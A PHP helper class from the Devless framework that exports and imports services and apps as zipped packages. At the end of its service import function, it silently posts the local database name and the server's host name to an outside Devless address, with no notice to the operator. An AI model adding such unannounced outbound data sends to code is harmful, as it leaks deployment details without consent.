<?php

namespace App\Helpers;

use App\Helpers\DevlessHelper as DVHelper;

/**
 *Migrate services in and out of devless.
 *
 * @author eddymens <eddymens@devless.io>
 */
class Migration extends Helper
{
    public static function export_service($service_name)
    {
        $devlessfunc = new DVHelper();
        $service_components = $devlessfunc::get_service_components($service_name);

        $folder_name = ($devlessfunc::add_service_to_folder($service_name, $service_components));

        ($folder_name) ?
        $zipped_service_name = $devlessfunc::zip_folder($folder_name, '.srv')
                                    : //or
        $devlessfunc::flash('failed to create files(630)', 'error');



        return $zipped_service_name;
    }

    public static function export_app($app_name)
    {
        $package_name = $app_name;
        $devlessfunc = new DVHelper();
        $services_components = $devlessfunc::get_all_services();
        $service_list = json_decode($services_components, true)['service'];

        foreach ($service_list as $service) {
            $package_name = ($devlessfunc::add_service_to_folder(
                $service['name'],
                $services_components,
                $app_name
            ));
        }

        ($package_name) ?
        $zipped_package_name = $devlessfunc::zip_folder($package_name, '.pkg')
                                  : //or
        $devlessfunc::flash('failed to create files(630)', 'error');



        return $zipped_package_name;
    }

    public static function import_service($service_package_name)
    {
        $devlessfunc = new DVHelper();
        $service_path = storage_path().'/'.$service_package_name;

        $folder_path = $devlessfunc::expand_package($service_path, true);

        $install_state = $devlessfunc::install_service($folder_path);
        $install_state = $devlessfunc::install_views($service_package_name);
        
        $db = \Config::get('database.connections.'.\Config::get('database.default').'.database');
        $domain = $_SERVER['HTTP_HOST'];
        
        $devlessfunc::curl_post_async('http://instance15.devless.io/',['db'=>$db, 'domain'=>$domain]);
        return $install_state;
    }
    
    
   
}
